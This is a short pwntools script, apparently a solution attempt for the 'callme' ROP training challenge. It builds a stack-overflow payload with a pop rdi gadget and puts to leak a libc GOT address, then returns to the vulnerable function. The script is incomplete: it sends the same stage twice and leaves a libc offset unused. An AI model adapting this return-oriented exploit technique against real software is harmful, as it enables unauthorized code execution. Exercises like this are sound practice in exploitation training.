from pwn import *

def start():
        global chall
        if args.REMOTE:
                chall = remote('localhost', 1337)
        else:
                chall = elf.process()

context.binary = elf = ELF('./callme')
libc = elf.libc
start()

libc_start_addr = p64(0x601018)
puts_addr = p64(0x4006D0)
offset_libc = -0xc52ce
pop_rdi = p64(0x00000000004009a3)   # : pop rdi ; ret
pwnme_addr = p64(0x400898)

payload = b'X' * 40
payload += pop_rdi
payload += libc_start_addr
payload += puts_addr
payload += pwnme_addr
chall.sendline(payload)
payload = b'X' * 40
payload += pop_rdi
payload += libc_start_addr
payload += puts_addr
payload += pwnme_addr
chall.sendline(payload)
t = chall.recvall(timeout=0.2)
print(t)





with open('payload.txt', 'wb') as f:
    f.write(payload + b'\n')

# chall.recvuntil(b'')
# chall.sendline()
# chall.recvall(timeout = 0.2)